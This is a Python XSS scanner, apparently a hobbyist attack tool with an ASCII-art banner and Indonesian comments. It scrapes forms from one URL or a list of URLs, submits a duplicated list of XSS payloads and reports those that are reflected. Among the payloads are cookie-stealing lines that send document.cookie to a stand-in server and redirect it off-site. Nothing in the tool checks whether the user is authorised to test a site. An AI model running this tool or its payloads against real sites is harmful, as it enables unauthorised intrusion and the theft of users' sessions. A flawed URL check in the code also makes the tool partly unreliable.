import sys
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from colorama import Fore, Style

print(
    Fore.RED +
    """
⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
⠀⠀⠀⠀⠀⣾⢿⠀⠇⠀⠀⠀⢸⠀⠀⢳⡀⢸⣿⡆⠀⠀⠀⣬⣿⡿⠟⠋⠉⠙⠻⣽⣀⡏⠀⠙⠃⢹⡙⡿⣷⠀⠀⢹⠀⠀⠀⠀⠰⠒
⠀⠀⠀⠀⢸⣿⣿⣇⢸⠀⠀⠀⢸⣦⣤⡀⣷⣸⡟⢧⣀⡴⠶⠿⠻⡄⣀⣤⣴⡾⠖⠚⠿⡀⠀⠀⠀⠈⣧⠁⠹⠆⠀⠀⣇⠀⠀⠀⠀⠀
⠀⠀⠀⢀⢸⣀⣼⣿⣼⡆⠀⢀⡘⡇⠀⠀⠹⡟⢷⡜⢉⣠⣠⣠⣀⣤⡿⣛⣥⣶⣾⡿⠛⠿⠿⣶⣦⡤⢹⠀⢀⠀⠀⠀⢹⡄⠀⠀⠀⠀
⠀⠀⠀⢸⢸⡛⠁⠀⠙⢿⠋⠉⠉⠻⠀⠀⠀⢿⣄⠈⠁⠀⠀⠀⢉⢟⣴⡿⠿⠟⢁⠇⠀⠀⠀⠀⠹⣿⠻⡇⢸⠀⠀⠀⠈⣷⠀⠀⠀⠀
⠀⣀⣀⣘⣿⡇⠀⢀⣠⣤⣶⣶⣶⣾⣦⡀⠀⠈⡿⠀⠀⠀⠀⠀⠀⣿⠟⠳⠦⡤⠊⠀⠀⠀⠀⠀⣸⠇⠀⡇⣼⠀⢰⠀⠀⢹⣇⠀⠀⠀
⠛⠁⠈⣿⣷⣧⣴⣿⠿⠛⣿⠿⣿⣿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣠⣴⣶⠿⠿⠿⡷⢛⠕⠷⡄⣧⣿⠀⢸⠀⠀⠸⣿⡄⠀⠀
⠀⠀⢠⣿⢿⣿⣿⠁⠀⠀⠈⠳⠤⠶⠃⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠟⣱⠒⡠⢆⡴⣣⣯⢞⣴⡟⢿⡄⡏⠀⠀⠀⡏⢷⡀⠀
⠀⠀⡌⣿⠀⠙⣿⡦⢀⣤⡴⣶⠖⣲⠆⢀⠞⠁⠱⠀⠀⠀⠀⠀⠠⣾⠟⠛⡡⠞⠁⢀⡴⢋⢎⣽⡿⣫⠋⠀⠘⢷⠃⡄⠀⠀⡇⠈⣿⡀
⠀⠀⣇⢹⣦⠀⠼⢃⡾⢋⣶⢃⡼⣹⡳⠃⠊⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⠠⠋⠀⡰⠋⠀⢘⣇⡇⠀⢠⠟⠀⡇⠀⠀⠀⠀⢹⡵       [ instagram: ep_001n ]                                                                      
⠀⠀⢻⣌⢿⡆⠀⡝⣼⠟⣩⢏⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠈⠀⣠⠏⣠⣾⡇⠀⠀⠀⠀⠘⣷        [ created by Zero ]
⡀⠀⢸⣿⣿⣷⠆⢠⠏⡴⠃⡡⠋⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠒⠤⣄⣀⠀⠀⢀⣰⠏⠀⠀⠀⠀⢀⣠⡾⠗⠋⢰⠏⡇⠀⠀⠘⠀⠰⢻
⣇⠀⠘⣿⣿⣟⠻⣄⡞⠀⠐⠁⠀⠀⠀⠀⠀⣠⠞⣩⣤⣶⣶⣾⣷⣶⣬⣿⣿⣿⡏⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢸⡆⡇⠀⠀⠀⠀⠀⠀
⠹⡄⠀⠹⣿⣿⡄⠀⠉⠉⠀⡀⠀⠀⠈⢻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⣧⠀⠀⠀⠀⠀⠀
⠀⣿⢦⣀⠘⢿⣷⡀⠀⠀⡀⢦⠀⠀⠀⠀⠹⣿⣿⠏⠙⢻⣿⡿⠛⠉⠀⠸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⡆⠀⠀⡀
⢼⣿⠀⠈⢳⣤⣉⣻⣤⣀⣉⣩⠆⠀⠀⠀⠀⠹⡿⠀⠀⠈⡿⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠓⠂⠀⣠⣾⣿⣿⡿⢿⡄⠀⣧⠀⠀⠹
⣾⠃⠀⣠⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⢠⠴⣿⡄⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⣧⣀⠧⣰⣻⢄⠀⠀
⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⢠⣿⣧⡸⣷⣄
⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀⠀
                                                       
    """ + Fore.RESET)

print()
print()

# Daftar payload XSS yang lebih beragam
XSS_PAYLOADS = [
    "<script>alert('hi')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<style>body{background:url('x') no-repeat;}</style>",
    "<svg><script>alert('XSS')</script></svg>",
    "<script>console.log('XSS')</script>",
    "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<w contenteditable id=x onfocus=alert()>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<style>body{background:url('x') no-repeat;}</style>",
    "<svg><script>alert('XSS')</script></svg>",
    "<script>console.log('XSS')</script>",
    "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<w contenteditable id=x onfocus=alert()>",
]

class MissingUrlException(Exception):
    pass

class BaseXSSScanner:
    def __init__(self, url):
        if not url:
            raise MissingUrlException('Url is required to run scanner.')
        
        self.url = url

    def _extract_forms(self, url):
        """
        Extract all forms from url.
        """
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        """
        Extract details from form like method, url, and inputs.
        """
        details = {}
        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def _submit_form(self, form_details, url, value):
        """
        Submits a form using form_details.
        """
        target_url = urljoin(url, form_details["action"])
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value

            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value

        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)

    def scan(self, url):
        """
        Given a url, it prints all XSS vulnerable forms.
        """
        forms = self._extract_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")

        for form in forms:
            form_details = self.get_form_details(form)
            for payload in XSS_PAYLOADS:
                response = self._submit_form(form_details, url, payload)
                print(f"[*] Testing form: {form_details}")
                print(f"[*] Using payload: {payload}")
                if payload in response.content.decode():
                    print(f"{Fore.RED}[+] XSS Detected on {url}{Style.RESET_ALL}")
                    print(f"[*] Form details:")
                    pprint(form_details)

class XSSGameScanner(BaseXSSScanner):
    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "")  # Ambil action atau default ke kosong
        method = form.attrs.get("method", "get").lower()  # Ambil method atau default ke 'get'
        
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

def normalize_url(url):
    """
    Normalize the URL by adding http:// if no scheme is provided.
    """
    if not url.startswith(('https://', 'https://')):
        url = 'https://' + url
    return url

def check_url_status(url):
    """
    Check if the URL is reachable.
    """
    try:
        response = requests.head(url, allow_redirects=True, timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] {url} is active.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[-] {url} returned status code: {response.status_code}{Style.RESET_ALL}")
            return False
    except requests.RequestException:
        print(f"{Fore.RED}[!] {url} is not reachable.{Style.RESET_ALL}")
        return False

def main():
    print(f"{Fore.RED}[*] XSS Scanner Menu:{Style.RESET_ALL}")
    print("1. Scan URL")
    print("2. Scan dari file list")
    print("3. Cek status URL dari file list")
    print("4. Keluar")

    pilihan = input("Pilih menu: ")

    if pilihan == "1":
        url = input("Masukkan URL: ")
        url = normalize_url(url)  # Normalisasi URL
        scanner = XSSGameScanner(url)
        scanner.scan(url)
    elif pilihan == "2":
        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
        try:
            with open(file_name, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()  # Menghapus spasi di awal dan akhir
                    url = normalize_url(url)  # Normalisasi URL
                    print(f"\n{Fore.BLUE}[*] Scanning {url}...{Style.RESET_ALL}")
                    scanner = XSSGameScanner(url)
                    scanner.scan(url)
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")
    elif pilihan == "3":
        active_urls = []
        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
        try:
            with open(file_name, 'r') as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()  # Menghapus spasi di awal dan akhir
                    url = normalize_url(url)  # Normalisasi URL
                    print(f"\n{Fore.BLUE}[*] Checking status for {url}...{Style.RESET_ALL}")
                    if check_url_status(url):
                        active_urls.append(url)
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")

        # Simpan hasil URL aktif ke file
        if active_urls:
            with open('active_urls.txt', 'w') as f:
                f.write("\n".join(active_urls))
            print(f"{Fore.GREEN}[*] Hasil pengecekan URL aktif telah disimpan di active_urls.txt.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] Tidak ada URL aktif ditemukan.{Style.RESET_ALL}")

    elif pilihan == "4":
        print("Keluar dari scanner.")
    else:
        print("Pilihan tidak valid. Silakan coba lagi.")

if __name__ == "__main__":    
    main()
